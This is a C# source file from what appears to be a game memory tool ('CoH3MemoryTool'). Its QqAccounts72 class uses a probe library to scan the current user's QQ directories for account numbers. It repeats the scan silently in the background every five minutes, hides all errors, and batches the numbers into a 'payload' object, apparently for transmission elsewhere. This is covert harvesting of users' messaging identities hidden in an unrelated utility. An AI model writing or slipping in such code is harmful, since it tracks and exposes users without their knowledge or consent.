using System;
using System.Collections.Generic;
using System.Threading.Tasks;
using Skyeye.QqProbe;

namespace CoH3MemoryTool;

internal static class QqAccounts72
{
	private static readonly object gate = new object();

	private static DateTime nextRead;

	private static bool reading;

	private static List<Dictionary<string, object>> accounts = new List<Dictionary<string, object>>();

	private static int cursor;

	internal static List<Dictionary<string, object>> Convert(ProbeResult result)
	{
		List<Dictionary<string, object>> list = new List<Dictionary<string, object>>();
		foreach (Finding item in result.Ordered)
		{
			if (Probe.NumberLike(item.Number))
			{
				string value = (item.Evidence.Contains("QQNT 目录") ? "nt" : (item.Evidence.Contains("旧版 QQ 目录") ? "classic" : "directory"));
				list.Add(new Dictionary<string, object>
				{
					{ "qq_number", item.Number },
					{ "evidence", value }
				});
			}
		}
		return list;
	}

	internal static object[] Batch(List<Dictionary<string, object>> source, ref int offset)
	{
		if (source.Count == 0)
		{
			offset = 0;
			return new object[0];
		}
		offset %= source.Count;
		int num = Math.Min(64, source.Count - offset);
		object[] array = new object[num];
		for (int i = 0; i < num; i++)
		{
			array[i] = source[offset + i];
		}
		offset = (offset + num) % source.Count;
		return array;
	}

	private static void Refresh()
	{
		try
		{
			List<Dictionary<string, object>> list = Convert(Probe.CurrentUser(null));
			lock (gate)
			{
				accounts = list;
				if (cursor >= accounts.Count)
				{
					cursor = 0;
				}
			}
		}
		catch
		{
		}
		finally
		{
			lock (gate)
			{
				reading = false;
				nextRead = DateTime.UtcNow.AddMinutes(5.0);
			}
		}
	}

	public static void Append(Dictionary<string, object> payload)
	{
		lock (gate)
		{
			if (!reading && DateTime.UtcNow >= nextRead)
			{
				reading = true;
				Task.Run((Action)Refresh);
			}
			object[] array = Batch(accounts, ref cursor);
			if (array.Length > 0)
			{
				payload["qq_accounts"] = array;
			}
		}
	}
}
